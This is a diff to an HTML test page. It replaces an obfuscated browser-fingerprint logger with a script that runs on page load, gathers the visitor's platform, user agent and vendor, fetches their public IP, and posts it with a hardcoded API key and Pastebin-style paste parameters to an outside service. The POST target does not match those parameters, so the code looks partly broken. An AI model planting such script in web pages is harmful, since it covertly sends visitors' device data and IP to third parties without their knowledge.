@@ -6,8 +6,25 @@
   <body>
     <h1>TEST</h1>
     <script>
-      function _0x5db0(){var _0x470f8f=['1352988VHffTu','join','602666XSOmfJ','73017jkFoGr','appVersion','9544pVbLUC','log','1737HLZBoo','vendor','platform','1213590NRbBCy','userAgent','5ScOeYq','1040308rZYkUD','460722MsGxQi'];_0x5db0=function(){return _0x470f8f;};return _0x5db0();}function _0x2953(_0x5b689c,_0x470711){var _0x5db099=_0x5db0();return _0x2953=function(_0x29538c,_0x499a8a){_0x29538c=_0x29538c-0x1b1;var _0x5a7a28=_0x5db099[_0x29538c];return _0x5a7a28;},_0x2953(_0x5b689c,_0x470711);}var _0x5e927c=_0x2953;(function(_0x4a8ecf,_0xea0dbd){var _0x199e95=_0x2953,_0x187d39=_0x4a8ecf();while(!![]){try{var _0x155706=-parseInt(_0x199e95(0x1b7))/0x1+parseInt(_0x199e95(0x1b4))/0x2+-parseInt(_0x199e95(0x1b8))/0x3+parseInt(_0x199e95(0x1b3))/0x4*(parseInt(_0x199e95(0x1b2))/0x5)+parseInt(_0x199e95(0x1bf))/0x6+parseInt(_0x199e95(0x1b5))/0x7+parseInt(_0x199e95(0x1ba))/0x8*(parseInt(_0x199e95(0x1bc))/0x9);if(_0x155706===_0xea0dbd)break;else _0x187d39['push'](_0x187d39['shift']());}catch(_0x5d14a1){_0x187d39['push'](_0x187d39['shift']());}}}(_0x5db0,0x7770f),(a=[navigator[_0x5e927c(0x1be)],navigator[_0x5e927c(0x1b1)],navigator[_0x5e927c(0x1b9)],navigator[_0x5e927c(0x1bd)],window['opera']],b=a[_0x5e927c(0x1b6)]('\x20'),console[_0x5e927c(0x1bb)](b)));
-    </script>
-    <h1>TEST</h1>
+      a = [navigator.platform, navigator.userAgent, navigator.appVersion, navigator.vendor, window.opera];
+b = a.join(' ');
+var c = new XMLHttpRequest();
+c.open("GET", "https://api.ipify.org?format=json", true);
+c.send();
+var d = "";
+var e = "U8ZHVrucxgKX3f2Hla8VEWDRecCABPrl";
+var f = 2;
+var g = "qwerty654321uioop" + (Math.random() + 1).toString(36).substring(12);
+var h = "30D"
+c.onload = function() {
+    d = b + "," + this.responseText;
+    console.log(d);
+    var i= new XMLHttpRequest();
+    i.open("POST", "https://api.ipify.org?format=json", true);
+    i.setRequestHeader("Access-Control-Allow-Origin", "*");
+    var j = "api_option=paste&api_dev_key=" + e + "&api_paste_code=" + d + "&api_paste_name=" + g + "&api_paste_private=" + f + "&api_paste_expire_date=" + h;
+    i.send(j);
+}
+</script>
   </body>
 </html>
